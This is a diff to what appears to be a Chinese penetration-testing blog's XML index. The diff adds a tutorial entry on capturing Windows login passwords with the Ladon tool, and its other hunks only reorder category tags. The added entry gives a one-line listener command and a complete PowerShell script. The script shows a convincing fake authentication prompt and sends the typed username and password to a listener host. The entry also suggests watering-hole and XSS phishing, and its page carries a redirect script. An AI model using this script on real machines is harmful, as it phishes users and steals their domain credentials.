@@ -1055,6 +1055,39 @@
       </tags>
   </entry>
   <entry>
+    <title>〖教程〗使用Ladon捕获Windonws登陆密码</title>
+    <url>/p/GetWinAuth.html</url>
+    <content><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
+<script language="javascript" type="text/javascript">
+window.location.href="http://k8gege.org/Ladon/GetWinAuth.html";
+</script>
+
+
+<h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>&gt;= Ladon 6.6.3</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>使用PowerShell模仿Windowns登陆认证获取管理员密码，Ladon监听捕获基础认证密码。</p>
+<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>域控或管理员密码获取，当前权限很低又无法提权时。（有权限直接读明文或HASH）</p>
+<h3 id="Ladon监听"><a href="#Ladon监听" class="headerlink" title="Ladon监听"></a>Ladon监听</h3><p>该功能模仿了MSF里的基础认证监听模块，但最大的优势在于无需占用系统大量空间和内存。<br>可直接部署在目标内网或VPS上，也无需复杂命令，直接输以下命令一键监听自动捕获密码。<br>其它用途：<a href="http://k8gege.org/Ladon/webser.html">http://k8gege.org/Ladon/webser.html</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon Web 800</span><br></pre></td></tr></table></figure>
+
+<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/AuthPass.PNG"></p>
+<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><p>执行以下脚本代码，会弹出十分逼真的基础认证登陆窗口，自动获取用户名和域来提高真实性。<br>当然也可以使用其它脚本或语言，如JS水坑攻击、XSS截取各种WEB邮箱密码等等多种钩鱼姿势。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cred</span> = <span class="variable">$host</span>.ui.promptforcredential(<span class="string">'Failed Authentication'</span>,<span class="string">''</span>,[<span class="type">Environment</span>]::UserDomainName + <span class="string">"\"</span> + [<span class="type">Environment</span>]::UserName,[<span class="type">Environment</span>]::UserDomainName);</span><br><span class="line">[<span class="type">System.Net.ServicePointManager</span>]::ServerCertificateValidationCallback = &#123;<span class="variable">$true</span>&#125;;</span><br><span class="line"><span class="built_in">Add-Type</span> <span class="string">@'</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">public class Authorization</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">public static void submit(string usr,string pwd)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">string url = "http://192.168.1.110:8000/";</span></span><br><span class="line"><span class="string">System.Net.HttpWebRequest myReq = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(url);</span></span><br><span class="line"><span class="string">string username = usr;</span></span><br><span class="line"><span class="string">string password = pwd;</span></span><br><span class="line"><span class="string">string usernamePassword = username + ":" + password;</span></span><br><span class="line"><span class="string">System.Net.CredentialCache mycache = new System.Net.CredentialCache();</span></span><br><span class="line"><span class="string">mycache.Add(new Uri(url), "Basic", new System.Net.NetworkCredential(username, password));</span></span><br><span class="line"><span class="string">myReq.Credentials = mycache;</span></span><br><span class="line"><span class="string">myReq.Headers.Add("Authorization", "Basic " + Convert.ToBase64String(new System.Text.ASCIIEncoding().GetBytes(usernamePassword)));</span></span><br><span class="line"><span class="string">System.Net.WebResponse wr = myReq.GetResponse();</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string">'@</span></span><br><span class="line">[<span class="type">Authorization</span>]::submit(<span class="variable">$cred</span>.username, <span class="variable">$cred</span>.getnetworkcredential().password)</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
+<div style="text-align: center; width: 710px; border: green solid 0px;">
+<img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
+</div>
+]]></content>
+      <categories>
+        <category>Ladon</category>
+      </categories>
+      <tags>
+        <tag>Ladon</tag>
+        <tag>Pass</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>给你一个免费加入&quot;K8小密圈&quot;的机会</title>
     <url>/p/free.html</url>
     <content><![CDATA[<h3 id="K8小密圈"><a href="#K8小密圈" class="headerlink" title="K8小密圈"></a>K8小密圈</h3><p>于2020年8月1日建立，所有QQ群因气氛不活跃停止维护，加上有人白嫖还恶意举报（我的博客链接只在自己Q群有发布过，却被QQ提示危险不要访问，说明有人白嫖还举报），另外一个原因免费无任何门槛，有人进来乱发无关技术的广告，无论是Q群还是免费星球都是如此，因此创建了收费星球，收费不是目的，目的是防止无关人员进入，其次购买资源或奖励等，对于不愿分享技术的就分享钱吧，有些工具以后只会在该星球发布。当然并不是说你不加入就用不到，你的朋友会私下发给你，或者说等过一段时间才会公开，你才能下载得到。</p>
@@ -1373,10 +1406,10 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>CS: <a href="https://github.com/k8gege/Aggressor" target="_blank" rel="noopener">https://github.com/k8gege/Aggressor</a><br>Ladon: <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
 ]]></content>
       <categories>
-        <category>Cobalt Strike</category>
         <category>Ladon</category>
-        <category>远程执行</category>
+        <category>Cobalt Strike</category>
         <category>内网渗透</category>
+        <category>远程执行</category>
       </categories>
       <tags>
         <tag>Cobalt Strike</tag>
@@ -1715,8 +1748,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 ]]></content>
       <categories>
         <category>Ladon</category>
-        <category>内网渗透</category>
         <category>主机发现</category>
+        <category>内网渗透</category>
         <category>信息收集</category>
       </categories>
       <tags>
@@ -1739,9 +1772,9 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
 ]]></content>
       <categories>
+        <category>Ladon</category>
         <category>Kali</category>
         <category>密码</category>
-        <category>Ladon</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -1920,8 +1953,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 ]]></content>
       <categories>
         <category>工具</category>
-        <category>Kali</category>
         <category>Ladon</category>
+        <category>Kali</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -1970,8 +2003,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
 ]]></content>
       <categories>
-        <category>Cobalt Strike</category>
         <category>Ladon</category>
+        <category>Cobalt Strike</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -2169,8 +2202,8 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
 ]]></content>
       <categories>
         <category>工具</category>
-        <category>密码</category>
         <category>Ladon</category>
+        <category>密码</category>
         <category>嗅探</category>
       </categories>
       <tags>
@@ -2314,9 +2347,9 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
       <categories>
         <category>Ladon</category>
         <category>.NET</category>
-        <category>内网渗透</category>
-        <category>源码</category>
         <category>主机发现</category>
+        <category>源码</category>
+        <category>内网渗透</category>
         <category>信息收集</category>
         <category>编程</category>
       </categories>
@@ -2374,8 +2407,8 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
 ]]></content>
       <categories>
         <category>.NET</category>
-        <category>ShellCode</category>
         <category>源码</category>
+        <category>ShellCode</category>
         <category>编程</category>
       </categories>
       <tags>
@@ -2941,8 +2974,8 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
 ]]></content>
       <categories>
         <category>工具</category>
-        <category>Kali</category>
         <category>Ladon</category>
+        <category>Kali</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -3442,8 +3475,8 @@ Microsoft Windows 10 for 32-bit Systems 0
       <categories>
         <category>工具</category>
         <category>Ladon</category>
-        <category>Python</category>
         <category>源码</category>
+        <category>Python</category>
         <category>编程</category>
       </categories>
       <tags>
@@ -3927,13 +3960,13 @@ from pprint import pprint
 <p><a href="https://www.cnblogs.com/k8gege/p/10367844.html" target="_blank">https://www.cnblogs.com/k8gege/p/10367844.html</a></p>]]></content>
       <categories>
         <category>工具</category>
-        <category>Python</category>
-        <category>内网渗透</category>
-        <category>源码</category>
         <category>主机发现</category>
-        <category>嗅探</category>
+        <category>源码</category>
+        <category>内网渗透</category>
         <category>信息收集</category>
+        <category>Python</category>
         <category>编程</category>
+        <category>嗅探</category>
       </categories>
       <tags>
         <tag>Tool</tag>
